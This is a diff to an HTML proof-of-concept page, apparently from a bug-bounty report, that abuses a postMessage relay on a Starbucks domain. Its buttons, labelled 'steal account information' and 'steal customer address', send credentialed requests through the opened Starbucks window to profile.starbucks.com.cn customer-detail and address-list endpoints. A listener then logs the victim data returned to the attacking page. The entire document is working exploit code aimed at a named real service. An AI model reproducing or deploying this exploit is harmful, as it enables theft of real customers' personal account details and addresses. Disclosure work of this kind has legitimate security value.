@@ -3,28 +3,36 @@
 <html>
 <title>Get the sensitive information by postmessage</title>
 <body>
-<button id="openH1">Click Here</button>
+<button id="openH1">Click Here for start</button>
+<button id="stealaccount">steal account information</button>
+<button id="stealcustom">steal customer address</button>
 <script>
 var h1Win;
 var s;
 function openWin(){
 	h1Win = window.open("https://chdlyncweb01.starbucks.com/Autodiscover/XFrame/XFrame.html");
-	s = setInterval(sendMessage, 1050);
 	}
 
 	function sendMessage(){
-var data = JSON.stringify({type:"GET",header:"aaaaa",url:"https://www.starbucks.com.cn/api/stores/nearby?lat=27.12851&lon=114.99263&limit=10&locale=ZH&features=&radius=3000&y9krpbr6=1&vd",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials = true}"});
+var data = JSON.stringify({type:"GET",header:"aaaaa",url:"https://profile.starbucks.com.cn/api/Customers/detail",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials = true}"});
 	h1Win.postMessage(data,"*");
-        console.log("success postmessage!")
+        console.log("postmessage successed for account!")
 			}
 
+function sendMessage1(){
+var data = JSON.stringify({type:"GET",header:"aaaaa",url:"https://profile.starbucks.com.cn/api/Customers/addresses/list",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials = true}"});
+	h1Win.postMessage(data,"*");
+        console.log("postmessage successed for customer!")
+			}
  
     // 接受server返回数据
     window.addEventListener('message', function(e) {
-        console.log('data from domain2 ---> ' + e.data);
+        console.log('Get data from starbucks ---> ' + e.data);
 	//clearInterval(s);
     }, false);
 document.getElementById("openH1").addEventListener('click', openWin);
+document.getElementById("stealaccount").addEventListener('click', sendMessage);
+document.getElementById("stealcustom").addEventListener('click', sendMessage1);
 </script>
 </body>
 </html>
